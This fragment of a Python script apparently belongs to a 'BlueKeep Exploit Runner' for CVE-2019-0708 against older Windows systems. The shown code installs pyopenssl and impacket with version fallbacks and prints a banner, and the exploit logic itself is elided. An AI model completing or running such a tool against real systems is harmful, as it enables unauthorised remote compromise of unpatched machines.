...
def install_requirements():
    ...
    # First try to install direct dependencies
    try:
        subprocess.run(["pip3", "install", "pyopenssl", "impacket"], check=True)
        return True
    except subprocess.CalledProcessError:
        print("[-] Failed to install direct dependencies")
        
        # Try installing specific versions that are compatible
        try:
            print("[*] Trying alternate compatible versions...")
            subprocess.run(["pip3", "install", "pyopenssl==24.0.0", "impacket==0.10.0"], check=True)
            return True
        except subprocess.CalledProcessError:
            # Final fallback - try to use existing packages
            print("[*] Checking if required packages are already installed...")
            try:
                # Just import test to see if we have the required packages
                subprocess.run(["python3", "-c", "import OpenSSL; import impacket"], check=True)
                print("[+] Required packages are already installed")
                return True
            except subprocess.CalledProcessError:
                print("[-] Failed to find required dependencies")
                return False
...
def main():
 ...
 CVE-2019-0708 Exploit Runner
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="BlueKeep Exploit Runner")
